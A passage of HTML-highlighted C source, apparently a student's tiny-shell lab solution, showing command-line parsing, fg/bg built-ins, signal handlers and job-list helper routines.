&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        state = bg ? BG : FG;</span><br><span class="line">           </span><br><span class="line">        <span class="comment">/* Block all signals.This process cannot be interrupted */</span></span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">        addjob(jobs, pid, state, cmdline);</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (bg) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> waitfg(pid);     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;      <span class="comment">/* builtin command */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">            listjobs(jobs);</span><br><span class="line">        <span class="keyword">else</span> do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* cmdline, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span>* delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">        buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">        buf++;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">        argv[argc++] = buf;</span><br><span class="line">        *delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        buf = delim + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">            buf++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">            buf++;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc - <span class="number">1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> jid = <span class="number">0</span>, pid = <span class="number">0</span>, isFG = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* cp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    isFG = (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;  <span class="comment">/* Parameter missing */</span></span><br><span class="line">        <span class="keyword">if</span> (isFG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;bg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cp = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (cp[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123; <span class="comment">/* The number stands for jid */</span></span><br><span class="line">        cp++;</span><br><span class="line">        <span class="comment">/* Check whether the ID is valid */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>* tmp = cp; *tmp != <span class="string">&#x27;\0&#x27;</span>; tmp++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*tmp &lt; <span class="string">&#x27;0&#x27;</span> || *tmp &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFG)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        jid = atoi(cp);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;              <span class="comment">/* The number stands for pid */</span></span><br><span class="line">        <span class="comment">/* Check whether the ID is valid */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>* tmp = cp; *tmp != <span class="string">&#x27;\0&#x27;</span>; tmp++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*tmp &lt; <span class="string">&#x27;0&#x27;</span> || *tmp &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFG)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pid = atoi(cp);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Since we want to put the process in the </span></span><br><span class="line"><span class="comment">    foreground or background, restart it if it was stopped */</span></span><br><span class="line">    kill(-job-&gt;pid, SIGCONT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isFG) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Any signal will wake up the process */</span></span><br><span class="line">    Sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* As long as there are foreground processes running, sleep */</span></span><br><span class="line">    <span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sigsuspend(&amp;mask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status, olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line"></span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The next step may involves deleting the job and cannot be interrupted */</span></span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* The program runs normally */</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Been suspended */</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Be terminated */</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">        kill(-pid, SIGINT);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No foreground job is running!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">        kill(-pid, SIGTSTP);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No foreground job is running!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span> </span>&#123;</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	clearjob(&amp;jobs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, max=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">	    max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>) &#123;</span><br><span class="line">	        jobs[i].pid = pid;</span><br><span class="line">	        jobs[i].state = state;</span><br><span class="line">	        jobs[i].jid = nextjid++;</span><br><span class="line">	        <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">		    nextjid = <span class="number">1</span>;</span><br><span class="line">	        <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">  	        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">	            <span class="built_in">printf</span>(<span class="string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tried to create too many jobs\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == pid) &#123;</span><br><span class="line">	    clearjob(&amp;jobs[i]);</span><br><span class="line">	    nextjid = maxjid(jobs)+<span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">	    <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	    <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">	        <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	    <span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">	        <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == pid) &#123;</span><br><span class="line">            <span class="keyword">return</span> jobs[i].jid;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span> &amp;&amp; jobs[i].state != FG) &#123;</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">	        <span class="keyword">switch</span> (jobs[i].state) &#123;</span><br><span class="line">		    <span class="keyword">case</span> BG: </span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;Running &quot;</span>);</span><br><span class="line">		        <span class="keyword">break</span>;</span><br><span class="line">		    <span class="keyword">case</span> ST: </span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;Stopped &quot;</span>);</span><br><span class="line">		        <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">default</span>:</span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>, </span><br><span class="line">			       i, jobs[i].state);</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, jobs[i].cmdline);</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: shell [-hvp]\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -h   print this message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -v   print additional diagnostic information\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -p   do not emit a command prompt\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 